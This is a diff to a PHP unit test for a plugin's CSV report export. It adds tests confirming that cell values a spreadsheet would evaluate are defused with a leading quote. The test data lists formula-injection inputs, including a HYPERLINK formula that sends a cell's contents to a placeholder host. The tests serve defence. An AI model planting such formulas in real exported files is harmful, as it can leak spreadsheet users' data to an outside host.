@@ -80,8 +80,59 @@ class ReportsAdminCsvTest extends TestCase
             'embedded newline'       => ["line one\nline two"],
             'empty'                  => [''],
             'only a backslash'       => ['\\'],
-            'leading equals'         => ['=1+1'],
+            // 'leading equals' used to live here. It no longer round-trips
+            // byte for byte, and deliberately so — see the formula tests
+            // below, which assert the new behaviour outright rather than
+            // leaving it as a hole in this provider.
         ];
+    }
+
+    /**
+     * Report rows carry member and group names, positions and notes, none of
+     * which this plugin authors. A value that a spreadsheet would evaluate is
+     * written as text instead.
+     *
+     * This costs the byte-for-byte round trip for such values: the reader
+     * sees the leading quote. That is the intended trade — the quote is
+     * consumed by Excel and LibreOffice on open, and a report is read, not
+     * re-imported.
+     *
+     * @test
+     * @dataProvider formulaLeadProvider
+     */
+    public function a_value_a_spreadsheet_would_evaluate_is_written_as_text(string $value): void
+    {
+        $row = $this->writeThenReadBack(['Chair', $value, 'Apologies']);
+
+        $this->assertSame("'" . $value, $row[1]);
+    }
+
+    /**
+     * @return array<string, array{0: string}>
+     */
+    public static function formulaLeadProvider(): array
+    {
+        return [
+            'equals'        => ['=1+1'],
+            'plus'          => ['+1+1'],
+            'minus'         => ['-1+1'],
+            'at'            => ['@SUM(A1)'],
+            'hyperlink'     => ['=HYPERLINK("//host/"&A1,"click")'],
+            'tab'           => ["\t=1+1"],
+            // A leading space does not stop the evaluation, so it must not
+            // stop the defusing either.
+            'space then eq' => [' =1+1'],
+        ];
+    }
+
+    /**
+     * @test
+     */
+    public function an_ordinary_value_is_left_alone(): void
+    {
+        $row = $this->writeThenReadBack(['Chair', 'North', 'Apologies']);
+
+        $this->assertSame('North', $row[1]);
     }
 
     /**
